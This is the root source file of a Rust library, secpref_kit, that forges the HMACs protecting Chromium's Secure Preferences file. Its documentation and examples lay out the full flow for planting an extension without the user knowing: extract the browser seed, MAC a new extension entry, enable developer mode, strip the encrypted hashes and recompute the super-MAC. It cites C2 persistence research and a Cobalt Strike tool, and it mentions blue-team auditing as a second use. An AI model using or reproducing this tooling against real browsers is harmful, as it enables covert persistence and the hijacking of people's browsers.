//! Chromium Secure Preferences HMAC forger.
//!
//! Rust implementation of the HMAC-SHA256 integrity primitives Chromium uses
//! to protect the `Secure Preferences` file. Given the browser's `chrome_seed`
//! (extracted from `resources.pak`) and Chromium's platform device ID, this library
//! computes:
//!
//! - Per-value MACs stored under `protection.macs.<path>`.
//! - The `super_mac` covering the whole `protection.macs` sub-tree.
//! - Extension IDs derived from a manifest `key` (SHA-256 + Chrome's `[a-p]`
//!   nibble encoding) or from an extension's on-disk path.
//! - Removal of `*_encrypted_hash` keys to request the conditional legacy-MAC
//!   fallback used by some Chromium builds.
//!
//! # What this crate is
//!
//! A pure-logic library. No filesystem writes, no registry access, no process
//! management. All primitives are functions that take inputs (seed, device ID, path,
//! value) and return bytes / JSON. Consumers decide how to apply them.
//!
//! # What this crate is not
//!
//! - Not browser discovery (see [`shxve/SilentChrome`] for orchestration).
//! - Not an extension file installer (consumer writes the files).
//! - Not an NMH / registry installer (see the future `nmh-install` crate).
//! - Not a browser-acceptance oracle: legacy MAC self-consistency does not
//!   validate encrypted hashes or prove restart retention and activation.
//!
//! # Quick tour
//!
//! ```no_run
//! use secpref_kit::{compute_mac, compute_super_mac, derive_from_path};
//! use serde_json::json;
//!
//! let seed: [u8; 64] = *b"..............................................................64";
//! let device_id = "S-1-5-21-123-456-789";
//!
//! // Derive an extension ID from a path.
//! let ext_id = derive_from_path(r"C:\Users\user\ext-dir");
//!
//! // Compute a per-preference MAC.
//! let path = format!("extensions.settings.{ext_id}");
//! let value = json!({"state": 1, "location": 4});
//! let mac = compute_mac(&seed, device_id, &path, &value);
//! assert_eq!(mac.len(), 64); // uppercase hex, 32 bytes
//!
//! // Compute the super-MAC over the protection.macs sub-tree.
//! let macs = json!({"extensions": {"settings": {ext_id.clone(): mac}}});
//! let super_mac = compute_super_mac(&seed, device_id, &macs);
//! assert_eq!(super_mac.len(), 64);
//! ```
//!
//! # Higher-level operations
//!
//! For the full add-extension flow (build settings, MAC everything, drop the
//! encrypted-hash sub-tree, recompute super-MAC), use the [`prefs`] module:
//!
//! ```no_run
//! use secpref_kit::{manifest, prefs};
//! use std::path::Path;
//!
//! let mut prefs_json: serde_json::Value = serde_json::from_str("{}").unwrap();
//! let m = manifest::parse(Path::new("/path/to/ext")).unwrap();
//! let ext_path = "/path/to/ext";
//! let ext_id = secpref_kit::resolve_ext_id(m.key.as_deref(), ext_path)
//!     .unwrap()
//!     .id()
//!     .to_string();
//! let settings = manifest::build_default_settings(&m, ext_path);
//!
//! let seed = [0u8; 64];
//! let device_id = "S-1-5-21-...";
//! prefs::add_extension(&mut prefs_json, &ext_id, settings, &seed, device_id).unwrap();
//! prefs::enable_developer_mode(&mut prefs_json, &seed, device_id).unwrap();
//! prefs::strip_encrypted_hashes(&mut prefs_json).unwrap();
//! let _super_mac = prefs::recompute_super_mac(&mut prefs_json, &seed, device_id).unwrap();
//! // Consumer now serialises `prefs_json` and writes it to disk atomically.
//! ```
//!
//! # Research reference
//!
//! The primitive has been publicly documented since 2020:
//!
//! - syntax-err0r, *Silently Install Chrome Extension* (2020).
//! - Adlice, *Secure Preferences Analysis*.
//! - `SpecterOps`, *Chromium Extension C2 Persistence* (2026-08-13).
//! - `asaurusrex/Silent_Chrome` (upstream Python implementation).
//! - `KingOfTheNOPs/SilentChrome-BOF` (Cobalt Strike BOF).
//!
//! The underlying legacy primitive has been public for years. Blue teams can
//! use this crate for integrity auditing:
//! compute the expected MACs and compare against what is written on disk.
//!
//! [`shxve/SilentChrome`]: https://github.com/shxve/SilentChrome

#![cfg_attr(docsrs, feature(doc_cfg))]
#![warn(missing_docs)]

pub mod error;
pub mod ext_id;
pub mod mac;
pub mod manifest;
pub mod prefs;
pub mod seed;

#[cfg(windows)]
pub mod sid;

pub use error::SecPrefError;
pub use ext_id::{
    canonical_extension_path, derive_from_key, derive_from_path, resolve as resolve_ext_id, ExtId,
};
pub use mac::{canonicalize, compute_mac, compute_super_mac, strip_empties};
pub use prefs::VerifyResult;
pub use seed::{
    extract_seed_from_pak, extract_seed_from_pak_bytes, extract_seed_from_pak_resource,
    extract_seed_from_pak_resource_bytes, SEED_LEN,
};
